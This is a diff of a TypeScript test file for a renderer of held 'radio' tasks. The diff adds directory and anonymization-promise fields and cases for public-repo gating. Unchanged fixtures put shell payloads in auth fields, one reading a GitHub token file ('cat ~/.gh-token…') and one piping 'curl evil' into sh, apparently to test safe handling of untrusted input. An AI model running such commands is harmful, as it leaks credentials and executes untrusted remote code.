@@ -7,6 +7,8 @@ import { RadioTaskRepo } from '@src/domain.objects/RadioTaskRepo';
 
 import { asRadioHeldOutput } from './asRadioHeldOutput';
 
+const DIR = '.behavior/.radio';
+
 const genRecord = (input: {
   title: string;
   reason?: string;
@@ -26,6 +28,7 @@ const genRecord = (input: {
     reason: input.reason ?? 'radio.uses:blocked — global',
     heldSeq: 1,
     deliveredExid: null,
+    promise: null,
   });
 
 describe('asRadioHeldOutput', () => {
@@ -33,6 +36,7 @@ describe('asRadioHeldOutput', () => {
     const held = ['a', 'b', 'c'].map((title) => ({
       record: genRecord({ title }),
       lift: 'rhx radio.uses --global allow',
+      dir: DIR,
     }));
 
     when('[t0] the stop reminder renders', () => {
@@ -59,13 +63,42 @@ describe('asRadioHeldOutput', () => {
         );
         expect(output).toMatchSnapshot();
       });
+
+      then(
+        'the footer names the vouch a public repo needs, since the list reads no visibility',
+        () => {
+          expect(output).toContain(
+            'delivers the backlog; a public repo needs `drain --promise task-to-public-repo-is-anonymized`, once checked',
+          );
+        },
+      );
+    });
+
+    when('[t2] the same tasks carry a promise', () => {
+      const output = asRadioHeldOutput({
+        held: held.map((entry) => ({
+          ...entry,
+          record: new RadioTaskRecord({
+            ...entry.record,
+            promise: 'task-to-public-repo-is-anonymized',
+          }),
+        })),
+        mode: 'list',
+      });
+
+      then('the footer says a plain drain delivers the backlog', () => {
+        expect(output).toContain(
+          'then the next push, or `rhx radio.task.queue drain`, delivers the backlog',
+        );
+        expect(output).not.toContain('a public repo needs');
+      });
     });
   });
 
   given('[case2] one task held, the gate open (S3)', () => {
     when('[t0] the stop reminder renders', () => {
       const output = asRadioHeldOutput({
-        held: [{ record: genRecord({ title: 'a' }), lift: null }],
+        held: [{ record: genRecord({ title: 'a' }), lift: null, dir: DIR }],
         mode: 'hook.onStop',
       });
 
@@ -79,7 +112,7 @@ describe('asRadioHeldOutput', () => {
 
     when('[t1] the list renders (L3)', () => {
       const output = asRadioHeldOutput({
-        held: [{ record: genRecord({ title: 'a' }), lift: null }],
+        held: [{ record: genRecord({ title: 'a' }), lift: null, dir: DIR }],
         mode: 'list',
       });
 
@@ -104,14 +137,17 @@ describe('asRadioHeldOutput', () => {
         {
           record: genRecord({ title: 'a', reason: 'upstream:auth' }),
           lift: null,
+          dir: DIR,
         },
         {
           record: genRecord({ title: 'b', reason: 'upstream:auth' }),
           lift: null,
+          dir: DIR,
         },
         {
           record: genRecord({ title: 'c' }),
           lift: 'rhx radio.uses --global allow',
+          dir: DIR,
         },
       ];
 
@@ -164,6 +200,7 @@ describe('asRadioHeldOutput', () => {
       {
         record: genRecord({ title: 'a', reason: 'upstream:rate-limit' }),
         lift: null,
+        dir: DIR,
       },
     ];
 
@@ -191,6 +228,88 @@ describe('asRadioHeldOutput', () => {
     });
   });
 
+  given('[case2.2.1] a task held for its anonymized promise', () => {
+    const held = [
+      {
+        record: genRecord({ title: 'a', reason: 'public-repo:unpromised' }),
+        lift: null,
+        dir: DIR,
+      },
+    ];
+
+    when('[t0] the stop reminder renders', () => {
+      const output = asRadioHeldOutput({ held, mode: 'hook.onStop' });
+
+      then(
+        'it counts it as one that awaits a promise, the verb in the singular',
+        () => {
+          expect(output).toContain('1 awaits an anonymized promise');
+          expect(output).toMatchSnapshot();
+        },
+      );
+    });
+
+    when('[t2] the stop reminder renders two that await', () => {
+      const output = asRadioHeldOutput({
+        held: [
+          ...held,
+          {
+            record: genRecord({ title: 'b', reason: 'public-repo:unpromised' }),
+            lift: null,
+            dir: DIR,
+          },
+        ],
+        mode: 'hook.onStop',
+      });
+
+      then('the verb is in the plural', () => {
+        expect(output).toContain('2 await an anonymized promise');
+      });
+    });
+
+    when('[t1] the list renders', () => {
+      const output = asRadioHeldOutput({ held, mode: 'list' });
+
+      then('it names the state, the record file, and the vouch', () => {
+        expect(output).toContain(
+          'state: awaits promise (public-repo:unpromised): a drain sends it only with --promise',
+        );
+        expect(output).toContain('.behavior/.radio/record.a.json');
+        expect(output).toContain(
+          'drain --promise task-to-public-repo-is-anonymized',
+        );
+        expect(output).toMatchSnapshot();
+      });
+    });
+  });
+
+  given(
+    '[case2.2.2] a task held because its visibility could not be read',
+    () => {
+      const held = [
+        {
+          record: genRecord({ title: 'a', reason: 'public-repo:unreadable' }),
+          lift: null,
+          dir: DIR,
+        },
+      ];
+
+      when('[t0] the list renders', () => {
+        const output = asRadioHeldOutput({ held, mode: 'list' });
+
+        then('the state line says the repo is treated as public, once', () => {
+          expect(output).toContain(
+            'state: awaits promise (public-repo:unreadable): visibility unreadable — treated as public; a drain sends it only with --promise',
+          );
+          expect((output ?? '').split('treated as public').length - 1).toEqual(
+            1,
+          );
+          expect(output).toMatchSnapshot();
+        });
+      });
+    },
+  );
+
   given('[case2.3] two updates to one issue, the first set aside', () => {
     const genUpdate = (input: { key: string; reason: string }) =>
       new RadioTaskRecord({
@@ -211,8 +330,8 @@ describe('asRadioHeldOutput', () => {
     when('[t0] the list renders, the record ahead still held', () => {
       const output = asRadioHeldOutput({
         held: [
-          { record: ahead, lift: null },
-          { record: behind, lift: null },
+          { record: ahead, lift: null, dir: DIR },
+          { record: behind, lift: null, dir: DIR },
         ],
         mode: 'list',
       });
@@ -233,8 +352,8 @@ describe('asRadioHeldOutput', () => {
     when('[t1] the stop reminder renders, the record ahead still held', () => {
       const output = asRadioHeldOutput({
         held: [
-          { record: ahead, lift: null },
-          { record: behind, lift: null },
+          { record: ahead, lift: null, dir: DIR },
+          { record: behind, lift: null, dir: DIR },
         ],
         mode: 'hook.onStop',
       });
@@ -249,7 +368,7 @@ describe('asRadioHeldOutput', () => {
 
     when('[t2] the list renders, the record ahead since dropped', () => {
       const output = asRadioHeldOutput({
-        held: [{ record: behind, lift: null }],
+        held: [{ record: behind, lift: null, dir: DIR }],
         mode: 'list',
       });
 
@@ -278,8 +397,9 @@ describe('asRadioHeldOutput', () => {
                 reason: null,
               }),
               lift: null,
+              dir: DIR,
             },
-            { record: behind, lift: null },
+            { record: behind, lift: null, dir: DIR },
           ],
           mode: 'list',
         });
@@ -306,10 +426,12 @@ describe('asRadioHeldOutput', () => {
       {
         record: genRecord({ title: 'a', reason: 'upstream:rate-limit' }),
         lift: null,
+        dir: DIR,
       },
       {
         record: genRecord({ title: 'b', reason: 'upstream:rate-limit' }),
         lift: null,
+        dir: DIR,
       },
     ];
 
@@ -367,6 +489,7 @@ describe('asRadioHeldOutput', () => {
             auth: 'as-human',
           }),
           lift: 'rhx radio.uses --global allow',
+          dir: DIR,
         },
         {
           record: new RadioTaskRecord({
@@ -374,10 +497,12 @@ describe('asRadioHeldOutput', () => {
             auth: "as-robot:shx(cat ~/.gh-token-o'neil)",
           }),
           lift: 'rhx radio.uses --global allow',
+          dir: DIR,
         },
         {
           record: genRecord({ title: 'plain' }),
           lift: 'rhx radio.uses --global allow',
+          dir: DIR,
         },
       ];
 
@@ -418,6 +543,7 @@ describe('asRadioHeldOutput', () => {
             auth: 'as-robot:shx(curl evil|sh)',
           }),
           lift: 'rhx radio.uses --global allow',
+          dir: DIR,
         },
       ];
 
@@ -447,10 +573,12 @@ describe('asRadioHeldOutput', () => {
             auth: 'as-human',
           }),
           lift: null,
+          dir: DIR,
         },
         {
           record: genRecord({ title: 'odd', reason: 'upstream:fault' }),
           lift: null,
+          dir: DIR,
         },
       ];
 
